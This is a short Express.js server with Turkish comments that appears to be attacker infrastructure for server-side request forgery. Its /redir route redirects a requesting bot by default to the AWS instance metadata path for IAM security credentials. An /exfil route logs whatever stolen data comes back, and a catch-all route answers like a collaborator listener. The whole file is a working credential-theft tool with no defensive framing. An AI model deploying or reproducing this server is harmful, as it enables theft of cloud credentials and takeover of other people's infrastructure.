const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Gelen istekleri ve query parametrelerini logla
app.use((req, res, next) => {
    console.log('--- YENİ İSTEK GELDİ ---');
    console.log('Method:', req.method);
    console.log('URL:', req.url);
    console.log('IP:', req.ip || req.headers['x-forwarded-for']);
    console.log('Headers:', req.headers);
    console.log('Query:', req.query);
    console.log('------------------------');
    next();
});

// AWS Metadata veya İç Ağ Yönlendiricisi
app.get('/redir', (req, res) => {
    // Hedef olarak doğrudan AWS IMDSv1 Metadata adresini veriyoruz:
    const target = req.query.target || 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
    
    console.log(`[!] Metadata Redirect tetiklendi! Hedef: ${target}`);
    
    // 302 Found ile botu AWS Metadata servisine fırlat
    return res.redirect(302, target);
});

// Eğer bot metadata'dan okuduğu veriyi query parametresi olarak geri getirirse buraya düşecek
app.get('/exfil', (req, res) => {
    console.log('[+] VERİ SIZDIRILDI (EXFIL):', req.query);
    return res.status(200).send("Data received");
});

app.use((req, res) => {
    return res.status(200).send("Collaborator success");
});

app.listen(3000, () => console.log("Metadata Avcısı 3000 portunda devrede!"));
